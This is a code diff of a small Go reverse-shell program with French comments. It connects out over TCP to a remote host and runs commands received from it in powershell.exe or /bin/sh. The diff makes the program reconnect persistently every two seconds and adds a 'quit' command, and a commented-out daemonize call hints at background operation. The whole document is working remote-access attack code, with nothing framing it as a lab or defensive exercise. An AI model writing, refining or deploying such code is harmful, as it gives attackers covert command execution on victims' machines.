@@ -15,7 +15,6 @@ import (
 
 // To-Do :
 // - afficher prompt
-// - autoriser le client à entrer une commande "quit"
 
 func main() {
 	// daemonize()
@@ -30,19 +29,21 @@ func daemonize() {
 }
 
 func connectToClient(host string, port int) {
-	connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
-	if err != nil {
-		time.Sleep(2 * time.Second)
-		connectToClient(host, port)
-	} else {
-		connexion.Write([]byte("[+] Connected to target.\n"))
-		var shell string
-		if runtime.GOOS == "windows" {
-			shell = "powershell.exe"
+	for {
+		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
+		if err != nil {
+			time.Sleep(2 * time.Second)
 		} else {
-			shell = "/bin/sh"
+			connexion.Write([]byte("[+] Connected to target.\n"))
+			var shell string
+			if runtime.GOOS == "windows" {
+				shell = "powershell.exe"
+			} else {
+				shell = "/bin/sh"
+			}
+			reverseShell(connexion, shell)
+			connexion.Close()
 		}
-		reverseShell(connexion, shell)
 	}
 }
 
@@ -50,7 +51,11 @@ func reverseShell(connexion net.Conn, shell string) {
 	for {
 		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
 		handleError(err)
-		cmdOutput, err := exec.Command(shell, strings.TrimSuffix(clientEntry, "\n")).Output()
+		clientEntry = strings.TrimSuffix(clientEntry, "\n")
+		cmdOutput, err := exec.Command(shell, clientEntry).Output()
+		if clientEntry == "quit" {
+			break
+		}
 		if err != nil {
 			connexion.Write([]byte("[-] Unknown command.\n"))
 		} else {
